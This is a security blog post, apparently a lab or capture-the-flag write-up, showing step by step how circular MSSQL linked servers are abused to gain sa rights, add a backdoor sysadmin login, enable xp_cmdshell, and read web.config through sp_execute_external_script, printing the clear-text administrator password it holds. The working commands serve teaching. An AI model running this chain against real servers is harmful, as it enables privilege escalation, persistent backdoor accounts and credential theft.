<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Abusing MSSQL Linked Servers [ Adding SA User &amp; File Read ]" /><meta name="author" content="r0b0tG4nG" /><meta property="og:locale" content="en" /><meta name="description" content="A friendly blog platform where i’ll discuss about my findings, tricks and techniques used in compromising targets. Have fun reading i hope you learn something new." /><meta property="og:description" content="A friendly blog platform where i’ll discuss about my findings, tricks and techniques used in compromising targets. Have fun reading i hope you learn something new." /><link rel="canonical" href="https://r0b0tg4ng.github.io//posts/Abusing-MSSQL-Linked-Servers/" /><meta property="og:url" content="https://r0b0tg4ng.github.io//posts/Abusing-MSSQL-Linked-Servers/" /><meta property="og:site_name" content="r0b0tG4nG" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-16T10:18:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Abusing MSSQL Linked Servers [ Adding SA User &amp; File Read ]" /><meta name="twitter:site" content="@r0b0tg4ng" /><meta name="twitter:creator" content="@r0b0tG4nG" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"r0b0tG4nG"},"dateModified":"2022-01-13T15:33:56+00:00","datePublished":"2021-12-16T10:18:00+00:00","description":"A friendly blog platform where i’ll discuss about my findings, tricks and techniques used in compromising targets. Have fun reading i hope you learn something new.","headline":"Abusing MSSQL Linked Servers [ Adding SA User &amp; File Read ]","mainEntityOfPage":{"@type":"WebPage","@id":"https://r0b0tg4ng.github.io//posts/Abusing-MSSQL-Linked-Servers/"},"url":"https://r0b0tg4ng.github.io//posts/Abusing-MSSQL-Linked-Servers/"}</script><title>Abusing MSSQL Linked Servers [ Adding SA User & File Read ] | r0b0tG4nG</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="r0b0tG4nG"><meta name="application-name" content="r0b0tG4nG"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/67085453?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">r0b0tG4nG</a></div><div class="site-subtitle font-italic">The Regular IT Guy <br> | OSCP | OSWA | eCCPTv2 | eWPT</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/r0b0tG4nG" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/r0b0tg4ng" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.youtube.com/channel/UCSY-pfwuYspZFlRsO7vBfIQ" aria-label="youtube" > <i class="fab fa-youtube"></i> </a> <a href="" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Abusing MSSQL Linked Servers [ Adding SA User & File Read ]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Abusing MSSQL Linked Servers [ Adding SA User & File Read ]</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> r0b0tG4nG </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Dec 16, 2021, 10:18 AM +0000" >Dec 16, 2021<i class="unloaded">2021-12-16T10:18:00+00:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, Jan 13, 2022, 3:33 PM +0000" >Jan 13, 2022<i class="unloaded">2022-01-13T15:33:56+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1196 words">6 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146367126-2c4334c7-4664-4581-9ab7-bcc2b0d9da0b.png" alt="image" /><br /><br /></p><p><strong>&gt; Information Gathering</strong><br /></p><p>Microsoft SQL Server is a <a href="https://en.wikipedia.org/wiki/Relational_database_management_system">relational database management system</a> developed by <a href="https://en.wikipedia.org/wiki/Microsoft">Microsoft</a>. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications which may run either on the same computer or on another computer across a network (including the Internet).<br /></p><p>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library. More Information can be found at <a href="https://github.com/SecureAuthCorp/impacket"> SecureAuth Corporation</a><br /></p><p>In this engagement, we will use <a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_24/examples/mssqlclient.py">Impacket-mssqlclient.py</a> script. First we will login to the mssql service using the <code class="language-plaintext highlighter-rouge">mssql-client.py</code>, to do this we will parse the database credentials and ip as agruments to the <code class="language-plaintext highlighter-rouge">mssql-client.py</code> script. <code class="language-plaintext highlighter-rouge">impacket-mssqlclient external_user:"#p00Public3xt3rnalUs3r#"@10.13.38.11</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146365268-90142593-59e6-4a33-8d10-1f6d3286ea9b.png" alt="image" /><br /></p><p>After logging in to the mssql database, we will haev to check if the user has sysadmin privileges on the databases. This can be done by querying the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-syslogins-transact-sql?view=sql-server-ver15">syslogins table</a> using the command <code class="language-plaintext highlighter-rouge">SELECT name,sysadmin from syslogins;</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146365388-6c93e881-bde7-493d-842c-d4423239c15d.png" alt="image" /><br /></p><p>The database has two users <code class="language-plaintext highlighter-rouge">sa</code> &amp; <code class="language-plaintext highlighter-rouge">external_user</code>. From the output, we can see the current user doesn’t have <code class="language-plaintext highlighter-rouge">sysadmin privileges</code>, which means we can’t use <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a> to execute OS commands. We can check this by trying to enable <code class="language-plaintext highlighter-rouge">xp_cmdshell</code><br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146365484-c895eebc-9914-4b07-8b40-5c2e1cd12635.png" alt="image" /><br /></p><p>Microsoft SQL servers provides the ability to link external resources such as Oracle databases and other SQL servers. This is common to find in domain environments and can be exploited in case of misconfigurations. To verify if there are any linked servers on the current database, we will have to query the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver15">sysservers table</a> by executing the command <code class="language-plaintext highlighter-rouge">select srvname,isremote from sysservers;</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146365758-f02ba0e1-f680-487e-8edd-3302e1026288.png" alt="image" /><br /></p><p>Quering the table displayed two entries: <code class="language-plaintext highlighter-rouge">POO_PUBLIC (current server)</code> and <code class="language-plaintext highlighter-rouge">POO_CONFIG</code>. According to the documentation, <code class="language-plaintext highlighter-rouge">isremote column</code> determines if a server is linked or not. The <code class="language-plaintext highlighter-rouge">value 1</code> stands for <code class="language-plaintext highlighter-rouge">remote server</code>, while the value <code class="language-plaintext highlighter-rouge">0 stands for a linked server</code>. From this, we can conclude that <code class="language-plaintext highlighter-rouge">POO_CONFIG</code> is a linked server.<br /></p><p>From the docs, <code class="language-plaintext highlighter-rouge">EXEC</code> statement can be used to execute queries on linked servers. The next step is to find out the user in whose context we will be able to query the linked server. To do this, we will type <code class="language-plaintext highlighter-rouge">EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];</code><br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146365942-3a17d65c-fa93-457b-b35e-8c9486a698e5.png" alt="image" /><br /></p><p>The queries on the linked server <code class="language-plaintext highlighter-rouge">POO_CONFIG</code> are running as <code class="language-plaintext highlighter-rouge">internal_user</code>. To do greater damage, in this scenario, we will need the permissions of the <code class="language-plaintext highlighter-rouge">sa</code> user, so its best to check is the <code class="language-plaintext highlighter-rouge">internal_user</code> is <code class="language-plaintext highlighter-rouge">sa</code> on the targett or has <code class="language-plaintext highlighter-rouge">sa</code> privileges assigned to this user. To do this, we will execute the commmand <code class="language-plaintext highlighter-rouge">EXECUTE ('SELECT name,sysadmin from syslogins;') at [COMPATIBILITY\POO_CONFIG];</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146366041-0c7e6ba7-4f7f-4d23-9751-e64b5f691fcc.png" alt="image" /><br /></p><p>Bad luck on our side, the user <code class="language-plaintext highlighter-rouge">internal_user</code> is also not a <code class="language-plaintext highlighter-rouge">sysadmin</code> on the target. That is not the end remember this target has linked databases so we can try to enumerate the <code class="language-plaintext highlighter-rouge">POO_CONFIG</code> server to see if it has more links. We can recon on more links using <code class="language-plaintext highlighter-rouge">EXECUTE ('select srvname,isremote from sysservers;') at [COMPATIBILITY\POO_CONFIG];</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146366129-93d9a1e9-7d5a-4ad1-bdc9-c266f4e62d5e.png" alt="image" /><br /></p><p><strong>&gt; Adding SA User</strong><br /></p><p>From the image above, we can see that <code class="language-plaintext highlighter-rouge">POO_CONFIG</code> is in turn linked to <code class="language-plaintext highlighter-rouge">POO_PUBLIC</code>, making it a circular link. This is good news to the eyes since we can use nested queries to find out what user we’re running as. Let’s execute this command <code class="language-plaintext highlighter-rouge">EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146366345-e90d8172-c3a7-4b0c-850f-1a1553ccae17.png" alt="image" /><br /></p><p>A nested <code class="language-plaintext highlighter-rouge">EXEC statement</code> is used to find the username after crawling back from the <code class="language-plaintext highlighter-rouge">POO_CONFIG link</code>. The query returned <code class="language-plaintext highlighter-rouge">sa</code>, which means that the link allows us to execute queries as the <code class="language-plaintext highlighter-rouge">sysadmin user</code> on our current database <code class="language-plaintext highlighter-rouge">POO_PUBLIC</code>. The diagram below shows how the links are crawled in order to attain <code class="language-plaintext highlighter-rouge">sa privileges</code>. We can use these privileges to change the <code class="language-plaintext highlighter-rouge">sa password</code> on <code class="language-plaintext highlighter-rouge">POO_PUBLIC</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146366439-f55a6706-98fe-4852-89c1-ce94c45b4d8e.png" alt="image" /><br /></p><p>With this information, we can add a new <code class="language-plaintext highlighter-rouge">sa user</code> to the <code class="language-plaintext highlighter-rouge">POO_PUBLIC</code> database using a nested query. We will add a new SQL user named <code class="language-plaintext highlighter-rouge">r0b0t</code> with the password <code class="language-plaintext highlighter-rouge">P@ssword123</code> . The <code class="language-plaintext highlighter-rouge">r0b0t</code> user will be granted <code class="language-plaintext highlighter-rouge">sysadmin level privileges</code>. To avoid errors, we all single quotes should be escaped with another quote.<br /></p><p>We now add the <code class="language-plaintext highlighter-rouge">r0b0t</code> user and also grant him the <code class="language-plaintext highlighter-rouge">sysadmin privileges</code>. To achieve this, we will use the following commands. <br /> <code class="language-plaintext highlighter-rouge">EXECUTE('EXECUTE(''CREATE LOGIN r0b0t WITH PASSWORD = ''''P@ssword123'''' '') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG" </code><br /> <code class="language-plaintext highlighter-rouge">EXECUTE('EXECUTE(''sp_addsrvrolemember ''''r0b0t'''' , ''''sysadmin'''' '') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG"</code><br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146366521-20ad5699-cced-436f-a8ba-643acd48d2b9.png" alt="image" /><br /></p><p>The command was executed successfully without any errors. We can login to the <code class="language-plaintext highlighter-rouge">mssql</code> database using the username <code class="language-plaintext highlighter-rouge">r0b0t</code> &amp; password <code class="language-plaintext highlighter-rouge">P@ssword123</code>. To achieve this, we will need <code class="language-plaintext highlighter-rouge">impacket-mssqlclient</code> script with the argument <code class="language-plaintext highlighter-rouge">impacket-mssqlclient r0b0t:'P@ssword123'@10.13.38.11</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146366926-91d93953-d63f-431f-acb4-305e1f275077.png" alt="image" /><br /></p><p><strong>&gt; File Read Using sp_execute_external_script</strong><br /></p><p>After a successful login with the <code class="language-plaintext highlighter-rouge">r0b0t</code> user credentials, we know this user has <code class="language-plaintext highlighter-rouge">sysadmin-level</code> privileges thus can enable and execute system commands using the <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> stored procedure. To enable <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> in <code class="language-plaintext highlighter-rouge">mssqlcient.py</code>, we will use the command <code class="language-plaintext highlighter-rouge">enable_xp_cmdshell</code> and install the new configuration using <code class="language-plaintext highlighter-rouge">RECONFIGURE</code>.We can test code execution using the command <code class="language-plaintext highlighter-rouge">xp_cmdshell whoami</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146375130-72777aea-8a3a-4a93-91ab-7a3bebc1a2e6.png" alt="image" /><br /></p><p>The SQL Server service found to be running as a standard service account. The <code class="language-plaintext highlighter-rouge">IIS web.config</code> file mostly contains credentials. Our main target now is to grab the contents of this file. We can siimply do this using <code class="language-plaintext highlighter-rouge">xp_cmdshell icacls c:\inetpub\wwwroot\web.config</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146375013-823bec14-6cc3-4170-a2e4-bd60f15c312e.png" alt="image" /><br /></p><p>Looks like we do not have permissions to read that file. What could be the problem? <code class="language-plaintext highlighter-rouge">icacls</code> is blocked on the target or we just lack permissions. So i tried to read other files on the target using the command <code class="language-plaintext highlighter-rouge">xp_cmdshell icacls c:\windows\system32\drivers\etc\hosts</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146374700-0a784fe4-ceb3-47bf-8a74-e75e8bd3fdb7.png" alt="image" /><br /></p><p>So <code class="language-plaintext highlighter-rouge">icacls</code> works perfect all we need is to find a new way to read files on the target through <code class="language-plaintext highlighter-rouge">mssql</code>. After digging around, i found out that there is an <code class="language-plaintext highlighter-rouge">SQL Server feature</code> called <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql?view=sql-server-ver15">sp_execute_external_script</a>. This stored procedure allows us to execute external scripts written in <code class="language-plaintext highlighter-rouge">Ruby</code> or <code class="language-plaintext highlighter-rouge">Python</code>. So first we have to enable this procedure to test some python codes. To enable this feature, we will use the command <code class="language-plaintext highlighter-rouge">EXEC sp_configure 'external scripts enabled', 1</code> and install this configuration with the command <code class="language-plaintext highlighter-rouge">RECONFFIGURE</code>.<br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146375288-30077f0f-80f1-4d9b-8d1e-d6c58acd17e6.png" alt="image" /><br /></p><p>With the feature enabled, We will build our external script using the python sample located at <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql?view=sql-server-ver15">sp_execute_external_script</a> main page. For test purposes, we will look at executing an <code class="language-plaintext highlighter-rouge">external python script</code> to print out a text on our screen using the command <code class="language-plaintext highlighter-rouge">EXEC sp_execute_external_script @language = N'Python', @script = N'print( "r0b0t Test Print" );';</code><br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146374831-be485bc8-96a8-4b84-9363-79f30bb30f22.png" alt="image" /><br /></p><p>Our external python script works good the next thing we have to do is to read the <code class="language-plaintext highlighter-rouge">web.config</code> file from <code class="language-plaintext highlighter-rouge">c:\inetpub\wwwroot\</code> directory. To do this, we will import python <code class="language-plaintext highlighter-rouge">os module</code> and execute the command <code class="language-plaintext highlighter-rouge">EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("type C:\inetpub\wwwroot\web.config");';</code><br /> <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/67085453/146374932-be5d8c9c-eea8-4bee-b2d6-6513b4175c6a.png" alt="image" /><br /></p><p>Hehehee guess what?? we did it. We are able to read files on the target using <code class="language-plaintext highlighter-rouge">external python scripts</code>. Fruits of the hunt?? we actually found the credentials in the <code class="language-plaintext highlighter-rouge">web.config</code> file.</p><pre><code class="language-web.config">        &lt;authentication mode="Forms"&gt;
            &lt;forms name="login" loginUrl="/admin"&gt;
                &lt;credentials passwordFormat = "Clear"&gt;
                    &lt;user 
                        name="Administrator" 
                        password="EverybodyWantsToWorkAtP.O.O."
                    /&gt;
                &lt;/credentials&gt;
            &lt;/forms&gt;
        &lt;/authentication&gt;
</code></pre><p>I hope you enjoyed the ride and also discovered something new. Kindly subscribe to my <a href="https://www.youtube.com/channel/UCSY-pfwuYspZFlRsO7vBfIQ"> YouTube channel</a> for more contents<b></b></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/exploiting/'>Exploiting</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a> <a href="/tags/mssql/" class="post-tag no-text-decoration" >mssql</a> <a href="/tags/impacket-mssqlclient/" class="post-tag no-text-decoration" >impacket-mssqlclient</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="/tags/xp-cmdshell/" class="post-tag no-text-decoration" >xp_cmdshell</a> <a href="/tags/sp-execute-external-script/" class="post-tag no-text-decoration" >sp_execute_external_script</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Abusing MSSQL Linked Servers [ Adding SA User & File Read ] - r0b0tG4nG&url=https://r0b0tg4ng.github.io//posts/Abusing-MSSQL-Linked-Servers/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Abusing MSSQL Linked Servers [ Adding SA User & File Read ] - r0b0tG4nG&u=https://r0b0tg4ng.github.io//posts/Abusing-MSSQL-Linked-Servers/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Abusing MSSQL Linked Servers [ Adding SA User & File Read ] - r0b0tG4nG&url=https://r0b0tg4ng.github.io//posts/Abusing-MSSQL-Linked-Servers/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/OSWA/">My OSWA Journey - New Age Begins</a><li><a href="/posts/Mssql-Jobs/">Manual SQLi On MSSQL [ Creating Jobs With Mssql ]</a><li><a href="/posts/OSCP/">My OSCP Journey - The Untold Story</a><li><a href="/posts/Exploiting-Jfrog-Artifactory/">Exploiting Jfrog Artifactory [ Server-side Request Forgery ]</a><li><a href="/posts/Exploiting-RocketChat/">Exploiting RocketChat [ Message Dump To RCE ]</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/exploit-db/">exploit-db</a> <a class="post-tag" href="/tags/hydra/">hydra</a> <a class="post-tag" href="/tags/burpsuite/">burpsuite</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/xp-cmdshell/">xp_cmdshell</a> <a class="post-tag" href="/tags/echoctf/">EchoCTF</a> <a class="post-tag" href="/tags/hack-the-box/">Hack the box</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a> <a class="post-tag" href="/tags/msfconsole/">msfconsole</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Kerberoasting-Using-Mssql-Server/"><div class="card-body"> <span class="timeago small" >Jan 13, 2022<i class="unloaded">2022-01-13T13:33:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Kerberoasting Using Mssql Server [ Abusing GenericAll ]</h3><div class="text-muted small"><p> &gt; Information Gathering From The previous writeup on Abusing MSSQL Linked Servers, we found credentials on the target. In this chapter, we will look at how we can perform kerberoast attacks ...</p></div></div></a></div><div class="card"> <a href="/posts/Mssql-Jobs/"><div class="card-body"> <span class="timeago small" >Dec 17, 2021<i class="unloaded">2021-12-17T10:18:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Manual SQLi On MSSQL [ Creating Jobs With Mssql ]</h3><div class="text-muted small"><p> &gt; Information Gathering SQL injection aka SQLi is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally al...</p></div></div></a></div><div class="card"> <a href="/posts/Junior-Dev/"><div class="card-body"> <span class="timeago small" >Nov 27, 2021<i class="unloaded">2021-11-27T03:33:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>JuniorDev Writeup PwnTillDawn</h3><div class="text-muted small"><p> &gt; Information Gathering Started with the usual nmap scan and from the scan we can see active ports. port 22 (ssh) &amp; port 30609 (jetty 9.4.27). Upon visiting the web service running on p...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/OSCP/" class="btn btn-outline-primary" prompt="Older"><p>My OSCP Journey - The Untold Story</p></a> <a href="/posts/Mssql-Jobs/" class="btn btn-outline-primary" prompt="Newer"><p>Manual SQLi On MSSQL [ Creating Jobs With Mssql ]</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/r0b0tg4ng">Saeed Bala Ahmed</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/exploit-db/">exploit db</a> <a class="post-tag" href="/tags/hydra/">hydra</a> <a class="post-tag" href="/tags/burpsuite/">burpsuite</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/xp-cmdshell/">xp_cmdshell</a> <a class="post-tag" href="/tags/echoctf/">EchoCTF</a> <a class="post-tag" href="/tags/hack-the-box/">Hack the box</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket mssqlclient</a> <a class="post-tag" href="/tags/msfconsole/">msfconsole</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script 